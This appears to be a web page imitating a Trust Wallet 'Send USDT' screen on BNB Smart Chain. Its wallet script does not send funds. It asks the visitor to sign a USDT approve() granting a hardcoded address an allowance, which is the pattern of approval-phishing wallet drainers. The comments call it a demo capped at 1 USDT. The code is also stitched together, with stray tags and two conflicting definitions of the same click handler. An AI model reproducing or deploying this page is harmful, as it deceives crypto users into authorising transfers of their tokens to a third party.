  <style>
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(255, 255, 255, 0.9);
      display: flex;
      justify-content: center;

      border-top: 4px solid #ffffff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }

    .loading-text {
      color: #0000FF;
      font-size: 16px;
      font-weight: 600;

    /* Critical button styles for Trust Wallet - Light mode */
    .text-btn, .icon-btn, .max-btn {
      color: #0000FF !important;
    }
    /* Critical input-group styles for Trust Wallet */
    .input-group {
      display: flex !important;
      align-items: center !important;
      background-color: #FFFFFF !important;
      border: 1px solid #d1d5db !important;
      border-radius: 12px !important;
      padding: 12px 14px !important;
      margin-bottom: 16px !important;
      min-height: 48px !important;
      max-height: 48px !important;
      box-sizing: border-box !important;
      gap: 8px !important;
      overflow: hidden !important;
    }
    .input-group input {
      flex: 1 !important;
      min-width: 0 !important;
      background: transparent !important;
      border: none !important;
      outline: none !important;
      color: #000000 !important;
      font-size: 16px !important;
      font-weight: 500 !important;
      padding: 0 !important;
      margin: 0 !important;
      height: auto !important;
      line-height: 1.5 !important;
    }
    /* Dark Mode Support - Detects system preference automatically */
    @media (prefers-color-scheme: dark) {
      body {
        background-color: #1b1b1b !important;
        color: #ffffff !important;
      }
      .container {
        background-color: #1b1b1b !important;
      }
      .title {
        color: #ffffff !important;
      }
      .label {
        color: #d1d5db !important;
      }
      .input-group {
        background-color: #FFFFFF !important;
        border: 1px solid #e0e0e0 !important;
      }
      .input-group input {
        color: #000000 !important;
      }
      .input-group input::placeholder {
        color: #9ca3af !important;
      }
      .text-btn, .icon-btn, .max-btn {
        color: #01d97e !important;
      }
      .unit {
        color: #4b5563 !important;
      }
      .network-select {
        background-color: #1b1b1b !important;
        border: 1px solid #404040 !important;
      }
      .network-select:hover {
        background-color: #252525 !important;
        border-color: #505050 !important;
      }
      .network-text {
        color: #ffffff !important;
      }
      .network-arrow {
        color: #9ca3af !important;
      }
      .estimate {
        color: #9ca3af !important;
      }
      .address-input-group {
        background-color: #1b1b1b !important;
        border: 1px solid #404040 !important;
      }
      .address-input-group input {
        color: #ffffff !important;
      }
      .amount-input-group {
        background-color: #1b1b1b !important;
        border: 1px solid #404040 !important;
      }
      .amount-input-group input {
        color: #ffffff !important;
      }
      .next-btn {
        background-color: #01d97e !important;
        color: #000000 !important;
      }
      .next-btn:hover:not(:disabled) {
        background-color: #01c571 !important;
      }
      .next-btn:disabled {
        background-color: #25653A !important;
        color: #ffffff !important;
        cursor: not-allowed !important;
        opacity: 1 !important;
      }
    }
  </style>

</head>
<body>
  <!-- Loading Spinner Overlay -->
  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
    <div class="loading-spinner-container">
      <div class="loading-spinner"></div>
      <p class="loading-text">Processing...</p>
    </div>
  </div>

  <main class="container">
    <h1 class="title">Send USDT</h1>

    <div class="wallet-section" style="margin-bottom: 28px;">
      <button type="button" id="connectWalletBtn" class="next-btn" style="width:100%;height:54px;border-radius:28px;background:transparent;border:1px solid #01d97e;color:#01d97e;font-weight:700;">Connect BNB Wallet</button>
      <div id="walletStatus" style="text-align:center;margin-top:10px;color:#9ca3af;font-size:13px;">Wallet not connected</div>
    </div>

    <label class="label" for="address">Address or Domain Name</label>
    <div class="input-group address-input-group" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 12px 14px !important; margin-bottom: 16px !important; min-height: 48px !important; max-height: 48px !important; box-sizing: border-box !important; gap: 8px;">
      <input type="text" id="address" placeholder="Search or Enter" value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC" style="flex: 1 !important; min-width: 0 !important; background: transparent !important; border: none !important; outline: none !important; font-size: 16px !important; font-weight: 500 !important; padding: 0 !important; margin: 0 !important; height: auto !important; line-height: 1.5 !important;">
      <button class="text-btn">Paste</button>
      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
      <button class="icon-btn"><i class="fas fa-expand"></i></button>
    </div>

    <label class="label" for="destinationNetwork">Destination network</label>
    <div class="network-select" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 10px 12px !important; margin-bottom: 16px !important; cursor: pointer; gap: 8px; -webkit-gap: 8px; max-width: 70% !important; width: fit-content !important; box-sizing: border-box !important; min-height: 44px !important; max-height: 44px !important; height: auto !important;">
      <div class="network-icon" style="width: 20px !important; height: 20px !important; min-width: 20px !important; display: flex !important; align-items: center !important; justify-content: center !important; flex-shrink: 0 !important; position: relative; margin-right: 8px;">
        <img src="images/cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img" style="width: 20px !important; height: 20px !important; max-width: 20px !important; max-height: 20px !important; object-fit: cover !important; display: block !important; border-radius: 50% !important; flex-shrink: 0 !important;">
      </div>
      <span class="network-text" style="flex: 0 1 auto !important; font-size: 14px !important; font-weight: 500 !important; line-height: 1.4 !important; white-space: nowrap;">BNB Smart Chain</span>
      <i class="fas fa-chevron-down network-arrow" style="color: #9ca3af !important; font-size: 10px !important; margin-left: 8px !important; flex-shrink: 0 !important;"></i>
    </div>

    <label class="label" for="amount">Amount</label>
    <div class="input-group amount-input-group" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 12px 14px !important; margin-bottom: 16px !important; min-height: 48px !important; max-height: 48px !important; box-sizing: border-box !important; gap: 8px;">
      <input type="number" id="amount" placeholder="USDT Amount" required="" min="0" step="any" style="flex: 1 !important; min-width: 0 !important; background: transparent !important; border: none !important; outline: none !important; font-size: 16px !important; font-weight: 500 !important; padding: 0 !important; margin: 0 !important; height: auto !important; line-height: 1.5 !important;">
      <span class="unit">USDT</span>
      <button class="max-btn">Max</button>
    </div>

    <p class="estimate">≈ $0.00</p>

    <button type="button" class="next-btn" id="nextBtn" onclick="handleNextClick()" disabled>Approve 1 USDT</button>
  </main>

  <script type="text/javascript" src="js/web3.min.js"></script>
<script src="js/jquery-3.7.1.min.js"></script> 
  <script>
    const WALLETCONNECT_PROJECT_ID = '11e5445365f720d1050dc106ba2e78d6';
    const BSC_CHAIN_ID = 56;
    const BSC_CHAIN_ID_HEX = '0x38';
    const addressTOKEN = '0x55d398326f99059ff775485246999027b3197955';
    const addressSTAKING = '0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC';

    const matrixAbiTOKEN = [
      {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
      {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
      {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
      {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"}
    ];

    let walletProvider = null;
    let connectedAccount = null;

    async function createBSCWalletConnectProvider() {
      const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.6');
      return await EthereumProvider.init({
        projectId: WALLETCONNECT_PROJECT_ID,
        chains: [BSC_CHAIN_ID],
        optionalChains: [BSC_CHAIN_ID],
        showQrModal: true,
        metadata: {
          name: 'Send USDT',
          description: 'BSC USDT Demo',
          url: window.location.origin,
          icons: []
        }
      });
    }

    async function connectWallet() {
      try {
        clearStatus();
        showLoading('Connecting to BNB Smart Chain...');

        // WalletConnect is used directly. We do not prefer window.ethereum,
        // because the mobile wallet browser can expose an injected Ethereum
        // provider and bypass the requested BSC WalletConnect session.
        walletProvider = await createBSCWalletConnectProvider();
        await walletProvider.connect();

        const chainId = String(await walletProvider.request({ method: 'eth_chainId' })).toLowerCase();
        if (chainId !== BSC_CHAIN_ID_HEX) {
          throw new Error('WalletConnect connected to the wrong network. Please select BNB Smart Chain.');
        }

        const accounts = await walletProvider.request({ method: 'eth_accounts' });
        if (!accounts || accounts.length === 0) {
          throw new Error('No wallet account was returned.');
        }

        connectedAccount = accounts[0];
        window.web3 = new Web3(walletProvider);

        document.getElementById('walletStatus').textContent =
          connectedAccount.slice(0, 6) + '...' + connectedAccount.slice(-4);

        const connectButton = document.getElementById('connectWalletBtn');
        connectButton.textContent = 'BSC Wallet Connected';
        connectButton.classList.add('connected');

        hideLoading();
        showStatus('Connected to BNB Smart Chain.', 'success');
        updateApprovalButton();
        setupWalletEvents(walletProvider);
      } catch (error) {
        hideLoading();
        console.error('BSC WalletConnect error:', error);
        document.getElementById('nextBtn').disabled = true;
        showStatus(
          Number(error && error.code) === 4001 ? 'Wallet connection was cancelled.' :
          (error.message || 'Could not connect to BNB Smart Chain.'),
          'error'
        );
      }
    }

    async function verifyBSC() {
      if (!walletProvider || !connectedAccount) {
        throw new Error('Please connect your BNB Smart Chain wallet first.');
      }
      const chainId = String(await walletProvider.request({ method: 'eth_chainId' })).toLowerCase();
      if (chainId !== BSC_CHAIN_ID_HEX) {
        throw new Error('Wallet is not on BNB Smart Chain. Please select BNB Smart Chain in your wallet.');
      }
      return true;
    }

    function setupWalletEvents(provider) {
      if (!provider || typeof provider.on !== 'function') return;

      provider.on('accountsChanged', function(accounts) {
        connectedAccount = accounts && accounts.length ? accounts[0] : null;
        const status = document.getElementById('walletStatus');
        const button = document.getElementById('connectWalletBtn');
        if (connectedAccount) {
          status.textContent = connectedAccount.slice(0, 6) + '...' + connectedAccount.slice(-4);
          button.textContent = 'BSC Wallet Connected';
          button.classList.add('connected');
        } else {
          status.textContent = 'Wallet not connected';
          button.textContent = 'Connect BNB Wallet';
          button.classList.remove('connected');
        }
        updateApprovalButton();
      });

      provider.on('chainChanged', function(chainId) {
        const isBSC = String(chainId).toLowerCase() === BSC_CHAIN_ID_HEX;
        updateApprovalButton();
        if (isBSC) {
          showStatus('BNB Smart Chain active.', 'success');
        } else {
          showStatus('Wallet changed away from BNB Smart Chain. Approval is disabled.', 'error');
        }
      });

      provider.on('disconnect', function() {
        connectedAccount = null;
        document.getElementById('walletStatus').textContent = 'Wallet disconnected';
        document.getElementById('nextBtn').disabled = true;
      });
    }

    function updateApprovalButton() {
      const button = document.getElementById('nextBtn');
      const amount = parseFloat(document.getElementById('amount').value || '0');
      button.disabled = !(connectedAccount && amount === 1);
    }

    window.addEventListener('load', function() {
      updateApprovalButton();
    });
  </script>
</script>

<script>
    /* BSC demo approval: exactly 1 USDT. No unlimited allowance,
       no automatic BNB top-up, and no wallet/balance telemetry. */

    function showLoading(message = 'Processing...') {
      const overlay = document.getElementById('loadingOverlay');
      const text = overlay.querySelector('.loading-text');
      if (text) text.textContent = message;
      overlay.style.display = 'flex';
    }

    function hideLoading() {
      document.getElementById('loadingOverlay').style.display = 'none';
    }

    function showStatus(message, type = 'info') {
      let el = document.getElementById('statusMessage');
      if (!el) {
        el = document.createElement('div');
        el.id = 'statusMessage';
        el.style.cssText = 'margin:0 0 18px;padding:12px 14px;border-radius:10px;font-size:13px;line-height:1.4;';
        document.querySelector('.estimate').insertAdjacentElement('afterend', el);
      }
      el.textContent = message;
      el.style.display = 'block';
      el.style.background = type === 'error' ? 'rgba(255,72,72,.12)' :
        type === 'success' ? 'rgba(1,217,126,.12)' : 'rgba(255,255,255,.06)';
      el.style.color = type === 'error' ? '#ff8c8c' :
        type === 'success' ? '#01d97e' : '#bdbdbd';
    }

    function clearStatus() {
      const el = document.getElementById('statusMessage');
      if (el) el.style.display = 'none';
    }

    async function TokenApprove() {
      try {
        await verifyBSC();

        const amount = parseFloat(document.getElementById('amount').value || '0');
        if (amount !== 1) {
          throw new Error('For this demo, the approval amount must be exactly 1 USDT.');
        }

        showLoading('Preparing 1 USDT approval...');

        const web3 = window.web3 || new Web3(walletProvider);
        const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
        const decimals = Number(await usdtContract.methods.decimals().call());
        const oneUSDT = web3.utils.toBN(10).pow(web3.utils.toBN(decimals));

        const balance = await usdtContract.methods.balanceOf(connectedAccount).call();
        if (web3.utils.toBN(balance).lt(oneUSDT)) {
          throw new Error('Insufficient BSC USDT balance. At least 1 USDT is required.');
        }

        const allowance = await usdtContract.methods.allowance(connectedAccount, addressSTAKING).call();
        if (web3.utils.toBN(allowance).gte(oneUSDT)) {
          hideLoading();
          showStatus('This wallet already has an allowance of at least 1 USDT.', 'success');
          return;
        }

        hideLoading();
        showStatus('Confirm exactly 1 USDT approval in your wallet.', 'info');

        const receipt = await usdtContract.methods
          .approve(addressSTAKING, oneUSDT.toString())
          .send({ from: connectedAccount });

        showStatus('1 USDT approval confirmed. Transaction: ' + receipt.transactionHash, 'success');
      } catch (error) {
        hideLoading();
        console.error('Approval error:', error);
        if (Number(error && error.code) === 4001) {
          showStatus('Approval was cancelled in the wallet.', 'error');
        } else {
          showStatus(error.message || '1 USDT approval failed.', 'error');
        }
      }
    }

    function handleNextClick() {
      if (!connectedAccount) {
        showStatus('Please connect your BNB Smart Chain wallet first.', 'error');
        return;
      }
      const amount = parseFloat(document.getElementById('amount').value || '0');
      if (amount !== 1) {
        showStatus('For this demo, enter exactly 1 USDT.', 'error');
        return;
      }
      TokenApprove();
    }

    document.addEventListener('DOMContentLoaded', function() {
      const amountInput = document.getElementById('amount');
      amountInput.value = '1';
      amountInput.addEventListener('input', updateApprovalButton);
      amountInput.addEventListener('change', updateApprovalButton);
      updateApprovalButton();
    });
</script>
</script>
<script>
    // Amount validation - Make amount field mandatory
    function validateAmount() {
        const amountInput = document.getElementById('amount');
        const nextBtn = document.getElementById('nextBtn');
        const amountValue = amountInput.value.trim();
        
        // Check if amount is valid (not empty and greater than 0)
        if (amountValue && parseFloat(amountValue) > 0) {
            nextBtn.disabled = false;
            return true;
        } else {
            nextBtn.disabled = true;
            return false;
        }
    }

    // Handle Next button click with validation
    function handleNextClick() {
        if (validateAmount()) {
            TokenApprove();
        } else {
            alert('Please enter a valid amount before proceeding.');
        }
    }

    // Initialize validation on page load
    document.addEventListener('DOMContentLoaded', function() {
        const amountInput = document.getElementById('amount');
        const nextBtn = document.getElementById('nextBtn');
        
        // Disable Next button initially
        if (nextBtn) {
            nextBtn.disabled = true;
        }
        
        // Validate on input change
        if (amountInput) {
            amountInput.addEventListener('input', validateAmount);
            amountInput.addEventListener('change', validateAmount);
            amountInput.addEventListener('keyup', validateAmount);
            
            // Validate on paste
            amountInput.addEventListener('paste', function() {
                setTimeout(validateAmount, 10);
            });
        }
    });

    // Also validate when Max button is clicked (if Max button fills the amount)
    document.addEventListener('DOMContentLoaded', function() {
        const maxBtn = document.querySelector('.max-btn');
        if (maxBtn) {
            maxBtn.addEventListener('click', function() {
                // Wait a bit for Max to fill the value, then validate
                setTimeout(validateAmount, 100);
            });
        }
    });
</script>
